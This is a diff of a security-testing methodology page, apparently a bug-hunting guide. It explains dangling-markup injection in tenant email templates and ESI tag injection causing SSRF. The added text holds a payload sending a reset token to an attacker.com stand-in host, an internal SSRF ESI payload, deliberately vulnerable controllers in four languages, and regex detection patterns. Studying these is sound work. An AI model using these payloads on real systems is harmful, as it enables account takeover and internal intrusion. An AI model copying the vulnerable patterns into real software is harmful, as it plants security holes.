     }
 }
 ```
 {% endtab %}
 {% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The architecture delegates branding and formatting authority to individual enterprise tenants, allowing them to supply custom HTML templates for system-generated emails, \[2] To enforce basic security, the backend retrieves the tenant's HTML and passes it through an HTML Sanitizer, ensuring `<script>` tags and known malicious payloads are stripped before dispatch, \[3] The architecture relies on sequential concatenation to merge the tenant's cosmetic content with the system's highly sensitive, operational data (the cryptographic reset token), \[4] The execution sink. The backend developer evaluates HTML purely as a collection of discrete, closed nodes. They fail to account for the fault-tolerant nature of client-side HTML parsers (like Apple Mail, Gmail, or Chromium). When the attacker intentionally supplies a syntactically malformed, unclosed tag (Dangling Markup), the client's parser actively attempts to repair the document structure by greedily consuming all subsequent text until a matching quote is found. This forces the client application to unknowingly embed the highly classified system token into the query parameters of the attacker's outbound image request, flawlessly exfiltrating the data out-of-band
+
+```http
+// 1. Attacker (Tenant Admin) navigates to their tenant customization dashboard.
+// 2. Attacker submits a custom email template. The payload omits the closing single quote.
+
+POST /api/v1/tenant/settings/email-template HTTP/1.1
+Host: admin.enterprise.tld
+Authorization: Bearer <tenant_admin_token>
+Content-Type: application/json
+
+{
+  "templateHtml": "<h1>Welcome to our platform!</h1><p>We are glad you are here.</p><img src='https://attacker.com/leak?data="
+}
+
+// 3. The backend sanitizer attempts to process the HTML. Many standard sanitizers 
+//    allow unclosed quotes if the tag itself isn't explicitly malicious.
+// 4. The backend saves the template.
+
+// 5. Attacker navigates to the public login portal and initiates a Password Reset 
+//    for the target victim (a Super Admin within that tenant).
+POST /api/v1/auth/forgot-password HTTP/1.1
+Host: auth.enterprise.tld
+Content-Type: application/json
+
+{"email": "super.admin@victim.com"}
+
+// 6. The backend concatenates the template and the system token:
+// <h1>...</h1><img src='https://attacker.com/leak?data=<br>Reset Token: SECURE_998811
+
+// 7. The victim's email client (e.g., Outlook) receives the HTML.
+// 8. The client parses the <img> tag. It absorbs "<br>Reset Token: SECURE_998811" into the 'src' attribute.
+// 9. The email client renders the image, making a silent HTTP GET request:
+//    GET /leak?data=<br>Reset Token: SECURE_998811 HTTP/1.1
+//    Host: attacker.com
+
+// 10. The attacker monitors their server logs, extracts the reset token, and completes the Account Takeover.
+```
+{% endstep %}
+
+{% step %}
+To provide white-label customization without compromising core platform security, architects deployed sequential HTML assembly pipelines, separating untrusted tenant cosmetic data from sensitive system operational data. This defense model relied on the strict assumption that string concatenation inherently preserved the logical isolation of the two data blocks. The vulnerability emerged from a deep misunderstanding of client-side HTML parsing heuristics. Web and email clients prioritize rendering over structural integrity, actively attempting to repair malformed markup. The attacker exploited this fault tolerance by injecting an unclosed HTML attribute (Dangling Markup) into the cosmetic payload. When the backend blindly concatenated the sensitive reset token below it, the client-side parser seamlessly absorbed the classified system data into the attacker's outbound network request attribute. This structural collapse successfully transformed an ostensibly inert HTML injection flaw into a pristine, cross-boundary data exfiltration vector
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Edge-Side Request Forgery via ESI Tag Injection in Cached Fragments
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on hyper-scale global content platforms, e-commerce storefronts, or media sites utilizing aggressive caching architectures (e.g., Varnish, Fastly, Akamai) combined with dynamic content generation
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the backend presentation tier and caching configuration
 {% endstep %}
 
 {% step %}
-
+Identify the "Edge Side Includes (ESI)" architecture. Caching an entire webpage containing dynamic elements (e.g., "Welcome, Username" or an active shopping cart) is impossible. To achieve 99% cache-hit ratios, developers cache the static HTML skeleton at the CDN Edge, and embed ESI tags (e.g., `<esi:include src="/api/cart/count" />`). The CDN dynamically fetches and stitches these specific fragments into the HTML just before delivering it to the user
 {% endstep %}
 
 {% step %}
-
+Investigate the API sanitization pipeline. The backend accepts untrusted user input (e.g., User Bios, Product Reviews, Forum Comments). To prevent standard Stored XSS, the backend passes this input through a strict HTML sanitizer, stripping all `<script>`, `<iframe>`, and JavaScript event handlers
 {% endstep %}
 
 {% step %}
-
+Analyze the protocol desynchronization. The backend HTML sanitizer is designed exclusively to evaluate HTML/XML according to W3C DOM specifications. It has zero awareness of Edge-specific namespaces or CDN execution directives
 {% endstep %}
 
 {% step %}
-
+Discover the fatal validation gap: When an attacker injects an ESI tag (e.g., `<esi:include src="...">`), the backend sanitizer parses it as a benign, unknown custom XML element. Because it contains no JavaScript, the backend sanitizer approves the payload and saves it to the primary database
 {% endstep %}
 
 {% step %}
-
+Understand the Proxy Execution vulnerability: The backend renders the HTML document containing the attacker's ESI tag and returns it to the Edge proxy. The Edge proxy, natively configured to parse and execute ESI tags, identifies the attacker's injected tag not as data, but as a highly privileged server-side execution directive
 {% endstep %}
 
 {% step %}
-
+Formulate the ESI Injection payload. Identify a text field that is reflected on a publicly cached page (e.g., your public profile bio)
 {% endstep %}
 
 {% step %}
-
+Construct an ESI payload designed to execute an internal Server-Side Request Forgery (SSRF) or exfiltrate sensitive HTTP request headers
 {% endstep %}
 
 {% step %}
-
+Payload structure for Internal SSRF: `<esi:include src="[http://internal-admin-service.local/api/system/purge-cache](http://internal-admin-service.local/api/system/purge-cache)" />`
 {% endstep %}
 
 {% step %}
-
+Submit the payload to the backend via standard application functionality
 {% endstep %}
 
 {% step %}
-
+The backend HTML sanitizer evaluates `<esi:include>`. Finding no Javascript, it allows it
 {% endstep %}
 
 {% step %}
-
+Navigate to the publicly cached page as a generic user (or trigger the CDN to cache the page)
 {% endstep %}
 
 {% step %}
+The backend generates the HTML and returns it to Varnish/Fastly
+{% endstep %}
 
+{% step %}
+The Edge Cache parses the HTML document. It detects the attacker's `<esi:include>` tag. Interpreting it as a legitimate structural command from the backend, the Edge node executes the outbound HTTP request to the internal microservice. The attacker achieves complete Server-Side Request Forgery, leveraging the Edge CDN's privileged network position purely via un-sanitized structural HTML injection
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
+(Response\.AddHeader\(\s*"Surrogate-Control"\s*,\s*"content=\\"ESI/1\.0\\"")|(\.Headers\.(?:Add|Append|Set)\(\s*"Surrogate-Control")|(\.Headers\.(?:Add|Append|Set)\(\s*"X-ESI")|(Surrogate-Control.*ESI/1\.0)
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
+(response\.addHeader\(\s*"Surrogate-Control")|(response\.setHeader\(\s*"Surrogate-Control")|(response\.addHeader\(\s*"X-ESI")|(setHeader\(\s*"Surrogate-Control".*ESI/1\.0)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
+(header\(\s*['"]Surrogate-Control\s*:.*ESI/1\.0['"]\))|(header\(\s*['"]X-ESI\s*:)|(header\(\s*['"]Surrogate-Control)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
+(res\.(?:set|setHeader|append)\(\s*['"]Surrogate-Control['"])|(res\.(?:set|setHeader|append)\(\s*['"]X-ESI['"])|(Surrogate-Control['"]\s*,\s*['"]content="ESI/1\.0")
 ```
 {% endtab %}
 {% endtabs %}
@@ -1189,25 +1033,25 @@ class ConstraintValidationPlugin {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
+Response\.AddHeader\("Surrogate-Control"|Headers\.(Add|Append|Set)\("Surrogate-Control"|Headers\.(Add|Append|Set)\("X-ESI"|Surrogate-Control.*ESI/1\.0
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
+response\.(addHeader|setHeader)\("Surrogate-Control"|response\.(addHeader|setHeader)\("X-ESI"|Surrogate-Control.*ESI/1\.0
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
+header\(['"]Surrogate-Control:.*ESI/1\.0|header\(['"]X-ESI:|header\(['"]Surrogate-Control
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
+res\.(set|setHeader|append)\(['"]Surrogate-Control['"]|res\.(set|setHeader|append)\(['"]X-ESI['"]|Surrogate-Control.*ESI/1\.0
 ```
 {% endtab %}
 {% endtabs %}
@@ -1217,185 +1061,127 @@ new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class ConstraintValidationMiddleware
+[HttpPost("/api/v1/profile/bio")]
+public async Task<IActionResult> UpdateBio([FromBody] UpdateBioRequest request)
 {
-    private readonly FieldDelegate _next;
-    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();
+    // [1]
+    // [2]
+    var sanitizer = new HtmlSanitizer();
+    // [3]
+    // [4]
+    // Sanitizer neutralizes scripts, but passes unrecognized XML nodes
+    var safeBio = sanitizer.Sanitize(request.Bio);
 
-    public ConstraintValidationMiddleware(FieldDelegate next)
-    {
-        _next = next;
-    }
+    var user = await _dbContext.Users.FindAsync(User.GetUserId());
+    user.Bio = safeBio;
+    await _dbContext.SaveChangesAsync();
 
-    public async Task InvokeAsync(IMiddlewareContext context)
-    {
-        // [1]
-        // [2]
-        var field = context.Selection.Field;
-        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");
+    return Ok();
+}
 
-        if (constraintDirective != null)
-        {
-            var pattern = constraintDirective.GetArgument<string>("pattern");
-            
-            // [3]
-            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));
-
-            foreach (var argument in context.Selection.SyntaxNode.Arguments)
-            {
-                var inputString = argument.Value.ToString();
-                
-                // [4]
-                // Blocks the main GraphQL execution pipeline synchronously
-                if (!regex.IsMatch(inputString))
-                {
-                    context.ReportError("Constraint validation failed.");
-                    return;
-                }
-            }
-        }
-
-        await _next(context);
-    }
+[HttpGet("/profile/{id}")]
+public async Task<IActionResult> GetProfile(string id)
+{
+    var user = await _dbContext.Users.FindAsync(id);
+    
+    Response.Headers.Add("Surrogate-Control", "content=\"ESI/1.0\"");
+    
+    return View("Profile", user);
 }
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```java
-public class ConstraintValidationMiddleware {
+@RestController
+public class ProfileController {
 
-    private final FieldDelegate next;
-
-    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();
-
-    public ConstraintValidationMiddleware(FieldDelegate next) {
-        this.next = next;
-    }
-
-    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {
+    @PostMapping("/api/v1/profile/bio")
+    public ResponseEntity<Void> updateBio(
+            @RequestBody UpdateBioRequest request
+    ) throws Exception {
 
         // [1]
         // [2]
-        Field field = context.getSelection().getField();
+        HtmlSanitizer sanitizer = new HtmlSanitizer();
 
-        Directive constraintDirective = field.getDirectives()
-                .stream()
-                .filter(d -> d.getName().equals("constraint"))
-                .findFirst()
-                .orElse(null);
+        // [3]
+        // [4]
+        // Sanitizer neutralizes scripts, but passes unrecognized XML nodes
+        String safeBio = sanitizer.sanitize(
+                request.getBio()
+        );
 
-        if (constraintDirective != null) {
+        User user = dbContext.users()
+                .findById(SecurityUtils.getUserId());
 
-            String pattern = constraintDirective.getArgument("pattern");
+        user.setBio(safeBio);
 
-            // [3]
-            Pattern regex = compiledConstraints.computeIfAbsent(
-                    field.getName(),
-                    p -> Pattern.compile(pattern)
-            );
+        dbContext.save(user);
 
-            for (Argument argument : context.getSelection()
-                    .getSyntaxNode()
-                    .getArguments()) {
+        return ResponseEntity.ok().build();
+    }
 
-                String inputString = argument.getValue().toString();
 
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!regex.matcher(inputString).matches()) {
+    @GetMapping("/profile/{id}")
+    public String getProfile(
+            @PathVariable String id,
+            HttpServletResponse response,
+            Model model
+    ) throws Exception {
 
-                    context.reportError(
-                        "Constraint validation failed."
-                    );
+        User user = dbContext.users()
+                .findById(id);
 
-                    return CompletableFuture.completedFuture(null);
-                }
-            }
-        }
 
-        return next.invoke(context);
+        response.addHeader(
+                "Surrogate-Control",
+                "content=\"ESI/1.0\""
+        );
+
+
+        model.addAttribute(
+                "user",
+                user
+        );
+
+        return "Profile";
     }
 }
 ```
-
-
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class ConstraintValidationMiddleware
+class ProfileController extends Controller
 {
-    private $next;
-
-    private array $compiledConstraints = [];
-
-    public function __construct(callable $next)
-    {
-        $this->next = $next;
-    }
-
-
-    public function invokeAsync($context)
+    public function updateBio(Request $request)
     {
         // [1]
         // [2]
-        $field = $context->selection->field;
+        $config = \HTMLPurifier_Config::createDefault();
+        
+        // [3]
+        // [4]
+        // If the configuration allows undefined tags or ignores namespaces, 
+        // the <esi:include> tag is persisted safely.
+        $purifier = new \HTMLPurifier($config);
+        $safeBio = $purifier->purify($request->input('bio'));
 
-        $constraintDirective = null;
+        $user = auth()->user();
+        $user->bio = $safeBio;
+        $user->save();
 
-        foreach ($field->directives as $directive) {
+        return response()->json(['status' => 'Updated']);
+    }
 
-            if ($directive->name === "constraint") {
-                $constraintDirective = $directive;
-                break;
-            }
-        }
-
-
-        if ($constraintDirective !== null) {
-
-            $pattern = $constraintDirective
-                ->getArgument("pattern");
-
-
-            // [3]
-            if (!isset($this->compiledConstraints[$field->name])) {
-
-                $this->compiledConstraints[$field->name] =
-                    $pattern;
-            }
-
-            $regex = $this->compiledConstraints[$field->name];
-
-
-            foreach (
-                $context->selection
-                    ->syntaxNode
-                    ->arguments as $argument
-            ) {
-
-                $inputString = (string)$argument->value;
-
-
-                // [4]
-                // Blocks GraphQL execution pipeline synchronously
-                if (!preg_match($regex, $inputString)) {
-
-                    $context->reportError(
-                        "Constraint validation failed."
-                    );
-
-                    return null;
-                }
-            }
-        }
-
-
-        return call_user_func(
-            $this->next,
-            $context
-        );
+    public function showProfile($id)
+    {
+        $user = User::findOrFail($id);
+        
+        // Tells the CDN to process Edge Side Includes
+        return response(view('profile', ['user' => $user]))
+                ->header('Surrogate-Control', 'content="ESI/1.0"');
     }
 }
 ```
@@ -1403,47 +1189,76 @@ class ConstraintValidationMiddleware
 
 {% tab title="Node.js" %}
 ```javascript
-const { ApolloGateway } = require('@apollo/gateway');
+const sanitizeHtml = require('sanitize-html');
 
-class ConstraintValidationPlugin {
+router.post('/api/v1/profile/bio', async (req, res) => {
     // [1]
     // [2]
-    // Executes during Supergraph composition
-    requestDidStart({ schema }) {
-        const compiledRegexes = new Map();
+    // Backend standard HTML Sanitizer
+    let safeBio = sanitizeHtml(req.body.bio, {
+        allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
+        // [3]
+        // [4]
+        // The sanitizer is unaware of <esi:include>. Depending on the library version
+        // or loose configuration allowing custom XML tags, the payload sails through.
+    });
 
-        // Recursively extract @constraint directives from the composed schema
-        Object.values(schema.getTypeMap()).forEach(type => {
-            if (type.astNode && type.astNode.directives) {
-                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
-                if (constraint) {
-                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
-                    if (patternArg) {
-                        // [3]
-                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
-                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
-                    }
-                }
-            }
-        });
+    await User.update({ bio: safeBio }, { where: { id: req.user.id } });
+    res.send({ status: 'Updated' });
+});
 
-        return {
-            async executionDidStart({ request }) {
-                // [4]
-                // Intercepts variables BEFORE passing the query to the Subgraph
-                for (const [key, value] of Object.entries(request.variables || {})) {
-                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
-                    if (regex && !regex.test(value)) {
-                        throw new Error(`Validation failed for ${key}`);
-                    }
-                }
-            }
-        };
-    }
-}
+// Response Route
+router.get('/profile/:id', async (req, res) => {
+    let user = await User.findByPk(req.params.id);
+    
+    // Sets headers instructing Fastly/Varnish to parse the response for ESI tags
+    res.setHeader('Surrogate-Control', 'content="ESI/1.0"');
+    
+    // The attacker's bio is embedded directly into the HTML
+    res.send(`<html><body>${user.bio}</body></html>`);
+});
 ```
 {% endtab %}
 {% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] To handle extreme global traffic loads, the enterprise architects shifted dynamic page assembly from the application servers to the Edge CDN using Edge Side Includes (ESI), \[2] The backend application is instructed to emit raw ESI tags within its HTML responses and signal the CDN via HTTP headers (`Surrogate-Control`) to execute them, \[3] The backend relies exclusively on a standard HTML Sanitizer to clean user inputs (like profile bios or forum comments), stripping cross-site scripting vectors based on W3C DOM specifications, \[4] The fatal boundary desynchronization. The backend sanitizer and the Edge Proxy operate on entirely different syntactic planes. The backend views `<esi:include>` as harmless, inert data because it lacks JavaScript. However, when the backend transmits the HTML to the CDN, the Edge Proxy evaluates the exact same string as a highly privileged, server-side execution directive. The attacker exploits this semantic gap by injecting structural proxy commands into standard user input fields. The CDN blindly executes the injected tag, granting the attacker the ability to forge outbound network requests originating from the trusted edge infrastructure
+
+```http
+// 1. Attacker updates their public profile bio, injecting an ESI tag.
+// The payload is designed to target an internal backend administrative microservice.
+
+POST /api/v1/profile/bio HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <attacker_token>
+Content-Type: application/json
+
+{
+  "bio": "Security Researcher <esi:include src='http://internal-admin-mesh.local/api/v1/system/purge-cache?force=true' />"
+}
+
+// 2. The backend HTML Sanitizer parses the bio. Finding no <script> tags, it saves the payload to the DB.
+// 3. The attacker navigates to their public profile page on the main domain.
+
+GET /profile/attacker123 HTTP/1.1
+Host: www.enterprise.tld
+
+// 4. The request hits the Varnish/Fastly CDN Edge node.
+// 5. The Edge Node queries the backend for the HTML.
+// 6. The backend returns the HTML containing the attacker's bio and the Surrogate-Control header.
+
+// 7. Varnish intercepts the response. It parses the HTML looking for <esi:include> tags.
+// 8. Varnish finds the attacker's injected tag: <esi:include src='http://internal-admin-mesh.local...' />
+// 9. Varnish pauses delivering the page, initiates an HTTP GET request to the internal microservice, 
+//    and blindly stitches the internal service's response back into the attacker's bio.
+// 10. The internal service executes the cache purge action without authentication because the request 
+//     originated from the highly trusted CDN Edge IP.
+```
+{% endstep %}
+
+{% step %}
+To maximize cache hit ratios for highly dynamic content, infrastructure engineers decoupled page assembly, shifting the aggregation of HTML fragments to the CDN Edge utilizing Edge Side Includes (ESI). This optimization established a layered parsing architecture where the backend generated content and the CDN structurally manipulated it prior to delivery. The security failure originated from a namespace and context dissonance between the two tiers. Backend developers applied strict HTML sanitization to neutralize client-side threats (XSS) but completely ignored proxy-side execution directives, assuming XML namespaces were inert. The attacker weaponized this parsing differential by submitting valid ESI syntax within standard text fields. The backend sanitizer validated the payload as structurally safe and persisted it. During edge assembly, the CDN intercepted the HTML, identified the attacker's ESI tag, and treated it as an authoritative backend instruction. This structural injection successfully hijacked the Edge node's network privileges, transforming benign text reflection into a devastating, infrastructure-level Server-Side Request Forgery (SSRF)
 {% endstep %}
 {% endstepper %}
 
